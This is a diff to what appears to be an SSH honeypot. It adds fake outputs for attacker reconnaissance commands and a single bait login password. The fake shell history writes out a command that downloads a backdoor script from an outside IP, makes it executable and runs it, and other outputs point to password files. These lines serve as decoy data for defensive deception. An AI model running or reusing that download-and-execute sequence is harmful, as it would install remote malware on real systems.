@@ -51,6 +51,70 @@ STATIC_RESPONSES = {
     "uptime": lambda ctx: " 10:20:05 up 12 days,  3:14,  1 user,  load average: 0.05, 0.08, 0.12",
     "lsblk": lambda ctx: "NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS\nsda      8:0    0   40G  0 disk \n└─sda1   8:1    0   40G  0 part /\nsdb      8:16   0  100G  0 disk \n└─sdb1   8:17   0  100G  0 part /opt/corp",
     "mount": lambda ctx: "/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)\nproc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\ntmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)\n/dev/sdb1 on /opt/corp type ext4 (rw,relatime)",
+
+    # ── NEW STATIC COMMANDS ──────────────────────────────────────────
+    "pwd": lambda ctx: ctx.get("current_directory", "/root"),
+
+    "history": lambda ctx: """    1  uname -a
+    2  ifconfig
+    3  cat /etc/passwd
+    4  ps aux
+    5  cd /var/www/html
+    6  ls -la
+    7  cat config.php
+    8  wget http://185.220.101.45/backdoor.sh
+    9  chmod +x backdoor.sh
+   10  ./backdoor.sh""",
+
+    "netstat": lambda ctx: """Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN
+tcp        0      0 10.0.2.15:22            192.168.1.50:54312      ESTABLISHED""",
+
+    "netstat -an": lambda ctx: """Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN
+tcp        0      0 10.0.2.15:22            192.168.1.50:54312      ESTABLISHED""",
+
+    "netstat -tulpn": lambda ctx: """Proto Recv-Q Send-Q Local Address     Foreign Address  State    PID/Program
+tcp        0      0 0.0.0.0:22        0.0.0.0:*        LISTEN   1/sshd
+tcp        0      0 0.0.0.0:80        0.0.0.0:*        LISTEN   412/apache2
+tcp        0      0 0.0.0.0:3306      0.0.0.0:*        LISTEN   389/mysqld
+tcp        0      0 127.0.0.1:6379    0.0.0.0:*        LISTEN   401/redis-server""",
+
+    "last": lambda ctx: """root     pts/0        192.168.1.50     Wed Mar 19 10:15   still logged in
+admin    pts/1        185.220.101.45   Mon Mar 17 22:47 - 23:01  (00:13)
+root     pts/0        192.168.1.50     Mon Mar 17 21:33 - 22:10  (00:36)
+deploy   pts/2        10.0.0.100       Sun Mar 16 14:22 - 14:45  (00:22)
+reboot   system boot  5.15.0-91        Sun Mar 16 14:18""",
+
+    "sudo -l": lambda ctx: f"""Matching Defaults entries for {ctx.get('username','root')} on ubuntu-server:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User {ctx.get('username','root')} may run the following commands on ubuntu-server:
+    (ALL : ALL) ALL""",
+
+    "crontab -l": lambda ctx: """# m h  dom mon dow   command
+*/5 * * * * /usr/bin/php /var/www/html/cron.php
+0 2 * * * /root/backup.sh
+@reboot /usr/local/bin/start_services.sh""",
+
+    "find / -name passwords": lambda ctx: """/var/www/html/config/passwords.bak
+/home/deploy/.passwords
+find: '/proc/tty/driver': Permission denied
+find: '/root/.ssh': Permission denied""",
+
+    "find / -name '*.conf'": lambda ctx: """/etc/apache2/apache2.conf
+/etc/mysql/mysql.conf.d/mysqld.cnf
+/etc/ssh/sshd_config
+/etc/redis/redis.conf
+find: '/proc/tty/driver': Permission denied""",
 }
 
 def get_fallback(cmd: str, ctx: dict) -> str:
@@ -386,8 +450,14 @@ class HoneypotServer(asyncssh.SSHServer):
         return True
     
     def validate_password(self, username, password):
-        print(f"🔑 Login: {username}/{password}")
+      HONEYPOT_PASSWORD = "root123"  # Change this to whatever you want
+      print(f"🔑 Login attempt: {username}/{password}")
+      if password == HONEYPOT_PASSWORD:
+        print(f"✅ Accepted: {username}")
         return True
+      else:
+        print(f"❌ Rejected: {username}/{password}")
+        return False
     
     def session_requested(self):
         username = self._conn.get_extra_info('username') or "root"
